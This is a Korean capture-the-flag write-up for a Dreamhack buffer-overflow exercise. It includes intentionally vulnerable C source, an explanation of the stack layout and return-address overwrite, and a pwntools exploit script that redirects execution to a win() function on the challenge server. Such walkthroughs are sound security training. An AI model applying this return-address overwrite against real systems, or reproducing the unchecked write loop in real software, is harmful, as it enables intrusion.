# 바이너리 분석

```
// gcc -o baby-bof baby-bof.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>

void proc_init()
{
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
}

void win()
{
  char flag[100] = {
      0,
  };
  int fd;
  puts("You mustn't be here! It's a vulnerability!");

  fd = open("./flag", O_RDONLY);
  read(fd, flag, 0x60);
  puts(flag);
  exit(0);
}

long count;
long value;
long idx = 0;
int main()
{
  char name[16];

  // don't care this init function
  proc_init();

  printf("the main function doesn't call win function (0x%lx)!\n", win);

  printf("name: ");
  scanf("%15s", name);

  printf("GM GA GE GV %s!!\n: ", name);

  printf("|  addr\t\t|  value\t\t|\n");
  for (idx = 0; idx < 0x10; idx++)
  {
    printf("|  %lx\t|  %16lx\t|\n", name + idx * 8, *(long *)(name + idx * 8));
  }

  printf("hex value: ");
  scanf("%lx%c", &value);

  printf("integer count: ");
  scanf("%d%c", &count);

  for (idx = 0; idx < count; idx++)
  {
    *(long *)(name + idx * 8) = value;
  }

  printf("|  addr\t\t|  value\t\t|\n");
  for (idx = 0; idx < 0x10; idx++)
  {
    printf("|  %lx\t|  %16lx\t|\n", name + idx * 8, *(long *)(name + idx * 8));
  }

  return 0;
}
```

<img width="635" alt="image" src="https://github.com/user-attachments/assets/86f241f4-c9a7-43e0-9022-f86a5d4836e4">
 
일단 소스코드의 `win` 함수를 보면, `./flag` 파일을 `open`해서 `read(fd, flag, 0x60);`를 통해 `fd`로 부터 `flag` 변수에 내용을 읽어온 후, `puts(flag)`로 내용을 출력하기 때문에 해당 함수를 실행시키는 것이 최종 익스플로잇 목표일 것이다.

그런데 잘보면 메인 함수에 `printf("the main function doesn't call win function (0x%lx)!\n", win);`를 통해 `win` 함수의 주소를 `%lx`를 통해 출력하는 부분이 존재한다. (`%lx`는 `long` 타입 16진수 형식으로 출력하는 것이다.)

해당 바이너리에는 `PIE`가 적용되어 있지 않기 때문에 로컬에서 찾은 `win`의 주소를 바로 저장하고 있어도 되고, 원격 서버에서 8자리를 입력 받아도 된다.

`BOF` 취약점이 존재하는 코드이므로 메인 함수의 `return address`를 `win`으로 덮으면 될 것 같다는 예상을 하며 계속 소스 코드를 읽어보자.

이후 `char name[16]`에 문자열을 입력 받고, 첫 번째 반복문을 통해 `idx = 0 ~ 15`까지 `name + idx * 8`의 주소와 해당 주소가 가리키는 값을 출력해준다.

잘 보면 아래와 같이 `name[16]`이므로, `"aa"`를 입력해줬을 때 `name`을 기준으로 `16`바이트만큼 공간을 차지하고, 바로 뒤에 `rbp`가 존재하며 그 뒤에 `7fa5cfb18d90`라는 `return_address`가 존재한다는 것을 확인할 수 있다.

<img width="479" alt="image" src="https://github.com/user-attachments/assets/84752597-5f33-451b-9e34-f20f4f961e6f">

gdb로 더 확실히 파악해보는 것이 중요하지만 일단 여기서는 대부분 `rbp`에 `1`이 대입되어 있고 바로 뒤에 `return_address`가 존재하기 때문에 이렇게 거의 확실히 예측할 수 있다.

gdb로도 한번 확인해보면 `scanf`의 인자에 저장되어 있는 `name`의 주소에 저장된 값들을 4칸 출력해서 `BACKTRACE`의 `return_address`와 비교해보면 위의 예상과 딱 맞는 것을 확인할 수 있다.

참고로, `libc_start_main`은 `libc`에 존재하기 때문에 `PIE`가 적용되지 않아도 `ASLR`으로 인해서 계속 주소가 랜덤화 된다. (대신 페이지 오프셋을 나타내는 하위 3바이트는 고정)

<img width="524" alt="image" src="https://github.com/user-attachments/assets/ee9411d5-cdfa-48d6-a929-44757e24877b">

<img width="508" alt="image" src="https://github.com/user-attachments/assets/52ad6451-e8fb-4264-9ccf-6dc3ccf80563">

<img width="987" alt="image" src="https://github.com/user-attachments/assets/1ae07af2-afa3-4d36-adde-d606183648fd">

그럼 이제, `return_address`에 위에서 출력으로 확인한 `win`의 주소를 넣으면 되겠다는 것을 생각하며 계속 코드를 살펴보자.

바로 아래를 보면, `scanf("%lx%c", &value);`를 통해 `hex` 형식으로 입력을 받아서 `value`에 대입해준다. `%c`는 버퍼에 남아있는 `\n`을 날리기 위한 것으로 꼭 필수적이진 않다는거 참고만 하자. (어쩌피 뒤에서 `%c`가 아닌 `%d`로 받기 때문에 `\n`이 무시되기 때문이다.)

그리고 아래의 반복문에서 사용할 `count`를 입력 받고, `value`를  `name + idx * 8`이 가리키는 값에 대입해준다.

```
for (idx = 0; idx < count; idx++)
{
  *(long *)(name + idx * 8) = value;
}
```

여기서 `BOF` 취약점이 발생해서, `count = 3`일 때 `return_address`를 가리키기 때문에 `value`에 앞에서 출력한 `win`의 주소를 대입해서 `return_address`로 대입해주면 익스플로잇을 성공할 수 있다.

**따라서, `value`에서는 앞에서 출력한 `win`의 주소를 대입해주고, `count`에는 최소 `4`를 입력해주면 된다. (안전하게는 `count = 4`이고, 값을 더 키워줘도 너무 키워져서 존재하지 않는 주소에 대입하는거 아니면 `win`에서 `exit`를 통해 종료해서 해당 주소는 참조하지 않으므로 괜찮다.)

# Exploit

주의할 점은, `value`를 `%lx`로 받기 때문에, `0x~~` 형식인 `hex(win_addr)`로 전달해줘야 한다. (`p64`로 하면 안됨)

```
from pwn import *

p = remote('host3.dreamhack.games', 18735)

p.recvuntil(b' function (')
win_addr = int(p.recvn(8), 16)

p.sendlineafter(b'name: ', b'a')
p.sendlineafter(b'hex value: ', hex(win_addr)) 
p.sendlineafter(b'integer count: ', b'4')

p.interactive()
```
